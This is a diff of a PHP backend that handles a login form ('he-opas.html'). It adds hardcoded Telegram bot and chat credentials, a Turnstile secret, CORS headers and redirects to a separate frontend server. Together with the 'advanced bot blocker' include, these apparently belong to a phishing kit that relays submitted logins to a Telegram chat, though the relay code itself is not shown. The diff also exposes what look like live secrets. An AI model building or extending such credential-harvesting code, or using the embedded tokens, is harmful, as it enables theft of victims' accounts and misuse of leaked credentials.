@@ -4,10 +4,33 @@ if (file_exists('config.php')) {
     require_once 'config.php';
 } else {
     // Fallback constants for development
+    define('FRONTEND_URL', 'http://localhost:8001');
+    define('LOGIN_PAGE', 'he-opas.html');
     define('TELEGRAM_BOT_TOKEN', '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms');
     define('TELEGRAM_CHAT_ID', '7608981070');
     define('TURNSTILE_SECRET', '0x4AAAAAABuU_Y3u4wDzmWBxJShHN2uHHTM');
     define('ENVIRONMENT', 'development');
+    define('ALLOWED_ORIGINS', ['http://localhost:8001', 'http://127.0.0.1:8001']);
+}
+
+// Set CORS headers for cross-origin requests
+$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
+$allowedOrigins = defined('ALLOWED_ORIGINS') ? ALLOWED_ORIGINS : ['http://localhost:8001'];
+
+if (in_array($origin, $allowedOrigins)) {
+    header("Access-Control-Allow-Origin: $origin");
+} else {
+    header("Access-Control-Allow-Origin: " . FRONTEND_URL);
+}
+
+header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
+header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
+header("Access-Control-Allow-Credentials: true");
+
+// Handle preflight OPTIONS request
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
+    exit;
 }
 
 // Include advanced bot blocker
@@ -282,22 +305,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
     
-    // Handle POST response - redirect to avoid resubmission
+    // Handle POST response - redirect to frontend server
     if ($error) {
-        // Redirect back with error message
-        $redirectUrl = "he-opas.html?email=" . urlencode($email) . "&error=" . urlencode($error);
+        // Redirect back to frontend with error message
+        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . "?email=" . urlencode($email) . "&error=" . urlencode($error);
         header("Location: $redirectUrl");
         exit;
     } else {
-        // Success - could redirect to success page or back to form
-        $redirectUrl = "he-opas.html?email=" . urlencode($email);
+        // Success - redirect to frontend with success indicator
+        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . "?email=" . urlencode($email) . "&success=1";
         header("Location: $redirectUrl");
         exit;
     }
 } else {
-    // GET request - redirect to the HTML template with any parameters
+    // GET request - redirect to the frontend server
     $queryString = $_SERVER['QUERY_STRING'] ?? '';
-    $redirectUrl = "he-opas.html" . ($queryString ? "?$queryString" : "");
+    $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . ($queryString ? "?$queryString" : "");
     header("Location: $redirectUrl");
     exit;
 }
